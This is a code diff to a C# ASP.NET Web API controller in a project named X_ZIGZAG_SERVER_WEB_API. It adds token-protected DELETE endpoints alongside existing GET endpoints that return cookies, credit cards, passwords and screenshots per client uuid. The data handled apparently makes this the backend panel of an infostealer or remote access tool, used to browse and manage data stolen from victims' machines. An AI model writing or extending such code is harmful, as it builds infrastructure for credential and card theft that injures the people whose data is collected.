@@ -44,6 +44,13 @@ namespace X_ZIGZAG_SERVER_WEB_API.Controllers
             return Ok(result);
         }
         [ServiceFilter(typeof(TokenValidationFilter))]
+        [HttpDelete("Cookies/{uuid}")]
+        public async Task<IActionResult> DeleteClientCookies(string uuid)
+        {
+            await clientService.DeleteAllCookies(uuid);
+            return Ok();
+        }
+        [ServiceFilter(typeof(TokenValidationFilter))]
         [HttpGet("CreditCards/{uuid}")]
         public async Task<IActionResult> GetClientCreditCards(string uuid)
         {
@@ -53,6 +60,13 @@ namespace X_ZIGZAG_SERVER_WEB_API.Controllers
                 return NotFound();
             }
             return Ok(result);
+        }
+        [ServiceFilter(typeof(TokenValidationFilter))]
+        [HttpDelete("CreditCards/{uuid}")]
+        public async Task<IActionResult> DeleteClientCreditCards(string uuid)
+        {
+            await clientService.DeleteAllCreditCards(uuid);
+            return Ok();
         }
         [ServiceFilter(typeof(TokenValidationFilter))]
         [HttpGet("Passwords/{uuid}")]
@@ -66,8 +80,15 @@ namespace X_ZIGZAG_SERVER_WEB_API.Controllers
             return Ok(result);
         }
         [ServiceFilter(typeof(TokenValidationFilter))]
+        [HttpDelete("Passwords/{uuid}")]
+        public async Task<IActionResult> DeleteClientPasswords(string uuid)
+        {
+            await clientService.DeleteAllPasswords(uuid);
+            return Ok();
+        }
+        [ServiceFilter(typeof(TokenValidationFilter))]
         [HttpGet("Screenshots/{uuid}")]
-        public async Task<IActionResult> ClientsScreenshots(string uuid)
+        public async Task<IActionResult> ClientScreenshots(string uuid)
         {
             var result = await clientService.GetScreenshots(uuid);
             if (result == null)
@@ -75,6 +96,13 @@ namespace X_ZIGZAG_SERVER_WEB_API.Controllers
                 return NotFound();
             }
             return Ok(result);
+        }
+        [ServiceFilter(typeof(TokenValidationFilter))]
+        [HttpDelete("Screenshots/{uuid}")]
+        public async Task<IActionResult> DeleteAllClientScreenshots(string uuid)
+        {
+            clientService.DeleteAllScreenShots(uuid);
+            return Ok();
         }
         [ServiceFilter(typeof(TokenValidationFilter))]
         [HttpGet("Screenshots/{uuid}/{screenIndex}/{screenshotName}")]
